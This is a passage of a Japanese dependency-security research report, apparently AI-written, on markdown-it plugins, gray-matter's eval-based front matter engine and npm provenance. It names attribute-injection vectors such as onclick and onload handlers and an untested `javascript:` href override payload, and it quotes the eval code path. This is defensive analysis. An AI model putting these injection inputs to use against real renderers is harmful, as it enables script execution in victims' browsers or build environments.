- フィルタの実装: `allowedAttributes` か `allowedAttributeValues` が空でない場合だけ属性をフィルタし、どちらも空なら無条件で全属性を返す。属性の付与は `class` / `css-module` が `attrJoin`、それ以外は `token.attrSet(key, value)` で上書き — [unpkg markdown-it-attrs@5.0.1/utils.js](https://unpkg.com/markdown-it-attrs@5.0.1/utils.js)
- markdown-it-attrs の属性注入について、CVE / GHSA / Snyk のエントリはない（仕様として扱われている） — [Snyk: markdown-it-attrs](https://security.snyk.io/package/npm/markdown-it-attrs), [GitHub Advisory Database](https://github.com/advisories)

### Inferences
- `html: true` について: 入力が作者本人の Markdown だけで、成果物をローカル / 自分で配布する単一 HTML として扱うなら、raw HTML を通しても「作者が自分で書いたスクリプトが動く」以上のリスクはない（脅威モデル上の信頼境界の内側にある）。ただし次の場合は信頼境界の外の入力になるので、`html: false` にするか DOMPurify などのサニタイザを入れる:
  - 他人のスライドや Web からコピーした Markdown を変換する
  - 将来、共同編集やサーバでの変換を想定する
- markdown-it-attrs は `html: false` の安全性を部分的に崩す。`{onclick=...}` や `{onload=...}` に加え、`attrSet` による `href` の上書きも可能になる。`href` の上書きは link パース時の `validateLink` を通らない可能性が高い（ソース上の推論で、未テスト）。推奨は `allowedAttributes: ['id', 'class', /^data-/]` のような allowlist の明示。id / class は DOM clobbering の観点から、Safety ドキュメントの通りプレフィックスの付与を検討する。
- linkify と typographer は、過去の DoS 勧告がすべてこの2つに集中している。スライド用途で不要なら無効のままでよい。有効にするなら 15.0.2 以上を使う。
- オフライン単一 HTML では、`file://` で開いたときの挙動（ローカルファイル参照など）がブラウザのオリジンポリシーに依存する。`validateLink` が `file:` リンクを拒否するのは、その点では好都合。

### Gaps
- markdown-it-attrs で `[text](/ok){href="javascript:..."}` のように href を上書きした場合に、実際に `javascript:` が出力されるかは実行検証していない（パッケージ実行禁止のため）。
- markdown-it の renderer が属性値を HTML エスケープすること（クォートから脱出できないこと）は、このセッションではソースで確認していない。
- markdown-it-container の `render` オプションでユーザが `info` 文字列を出力する場合のエスケープは、プラグイン側では行われないと考えられるが、README / ソースは未確認。

---

## Q5b. gray-matter の eval ベース JavaScript front matter エンジン（要確認事項）

### Takeaway
確認できた。gray-matter@4.0.3（最新）には、デフォルトで登録された `javascript` エンジンがあり、`eval()` で front matter を評価する。最初の区切りを `---js` や `---javascript` にするだけで有効になる。作者本人の入力だけなら問題は小さいが、他人の Markdown を変換すると任意コード実行（Node.js 権限）になる。YAML 経路は `yaml.safeLoad` を使っていて安全。

### Cited Findings
- `engines.javascript.parse` の実装: `str = '(function() {\nreturn ' + str.trim() + ';\n}());'` で包んでから `return eval(str) || {};`（`/* eslint no-eval: 0 */` つき） — [unpkg gray-matter@4.0.3/lib/engines.js](https://unpkg.com/gray-matter@4.0.3/lib/engines.js)
- YAML エンジンは `yaml.safeLoad.bind(yaml)` / `yaml.safeDump` — [unpkg gray-matter@4.0.3/lib/engines.js](https://unpkg.com/gray-matter@4.0.3/lib/engines.js)
- 言語の検出: 「use the language defined after first delimiter, if it exists」。`matter.language()` が最初の区切り直後から改行までの文字列を言語名として使う — [unpkg gray-matter@4.0.3/index.js](https://unpkg.com/gray-matter@4.0.3/index.js)
- エイリアス: `js` / `javascript` はどちらも `javascript` エンジンにマップされる — [unpkg gray-matter@4.0.3/lib/engine.js](https://unpkg.com/gray-matter@4.0.3/lib/engine.js)
- エンジンは上書きできる: `opts.engines = Object.assign({}, engines, opts.parsers, opts.engines)`（ユーザ指定が後から勝つ） — [unpkg gray-matter@4.0.3/lib/defaults.js](https://unpkg.com/gray-matter@4.0.3/lib/defaults.js)
- gray-matter の最新は 4.0.3（2021-04-24）のまま — [registry: gray-matter](https://registry.npmjs.org/gray-matter)

### Inferences
- gray-matter を使うなら、`matter(src, { engines: { javascript: () => { throw new Error('disabled') }, js: ... } })` のように JS エンジンを明示的に無効化するのが定石。ただし前述の依存問題（js-yaml 3.x、未修正の sprintf-js、2021年以降停止）もある。
- markdown-it-front-matter は front matter の生文字列をコールバックに渡すだけで、パースはしない。js-yaml 5.x の `load`（デフォルトスキーマは安全）と組み合わせるほうが、攻撃面・依存・保守性のすべてで有利。

### Gaps
- gray-matter のリポジトリに eval エンジンを問題視した issue や PR があるか（81件の open issue の中身）は確認していない。GHSA / CVE としての登録はない。

---

## Q6. npm provenance / trusted publishing の有無

### Takeaway
markdown-it 本体（15.0.2）、linkify-it、mdurl、uc.micro、argparse、punycode.js、markdown-it-container、markdown-it-attrs、markdown-it-front-matter、gray-matter、js-yaml には、npm provenance attestation がない（手動公開）。provenance と trusted publishing（GitHub Actions OIDC）を使っているのは、依存の中では entities 8.x だけ。比較対象では marked が使っている。ただし 2026年の事件では悪性版が正規の provenance 付きで公開されているので、provenance は真正性の証明にはなっても、安全性の保証にはならない。

### Cited Findings
- markdown-it@15.0.2: `dist.attestations` なし。`_npmUser` は `vitaly`（個人アカウントによる公開） — [registry.npmjs.org/markdown-it](https://registry.npmjs.org/markdown-it)
- entities@8.1.0: `attestations.provenance.predicateType = https://slsa.dev/provenance/v1`。`_npmUser` は「GitHub Actions」（`trustedPublisher: {id: 'github'}`）。8.0.0（2026-03-17）から。7.x 以前は feedic による手動公開 — [registry.npmjs.org/entities](https://registry.npmjs.org/entities)
- marked@18.1.1: SLSA provenance あり、trusted publisher は GitHub — [registry.npmjs.org/marked](https://registry.npmjs.org/marked)
- linkify-it、mdurl、uc.micro、argparse、js-yaml、markdown-it-container（いずれも vitaly）、markdown-it-attrs（arve0）、markdown-it-front-matter（parksb）、gray-matter（rmassaioli）、punycode.js（google-wombot）、micromark / remark / unified（wooorm）: attestations なし — [registry: linkify-it](https://registry.npmjs.org/linkify-it), [registry: markdown-it-attrs](https://registry.npmjs.org/markdown-it-attrs), [registry: markdown-it-container](https://registry.npmjs.org/markdown-it-container), [registry: micromark](https://registry.npmjs.org/micromark)
- provenance の限界:
  - keyv 事件（2026-08）の悪性版は「valid provenance signed by GitHub Actions」付きで公開された — [Aikido](https://www.aikido.dev/blog/keyv-and-friends-compromised-in-npm-supply-chain-attack)
  - TanStack（2026-05）と Red Hat（2026-06）の悪性版も正規の SLSA provenance 付き — [Unit 42](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
  - SAP CAP（2026-04）では、trusted publisher のスコープ設定ミスが根本原因 — [Unit 42](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)

### Inferences
- markdown-it 系は provenance がないので、「公開物が GitHub のソースからビルドされたか」を利用者側で検証できない。対策としては次の3つが考えられる:
  - ロックファイルの `integrity` を固定する
  - 新しい版を入れるまでに待機期間を置く
  - 更新時に unpkg や `npm pack --dry-run` で差分を目視確認する（実行を伴わない範囲で）
- ただし 2026年の事件を見る限り、provenance の有無は悪性版の防止にほとんど効いていない。採否の判断では「依存の数・メンテナ数・install スクリプトの有無・ロックファイル運用」のほうが重要。

### Gaps
- vitaly アカウントが npm の 2FA（WebAuthn など）を有効にしているか、markdown-it 組織に trusted publishing の導入計画があるかは、公開情報で確認できなかった。
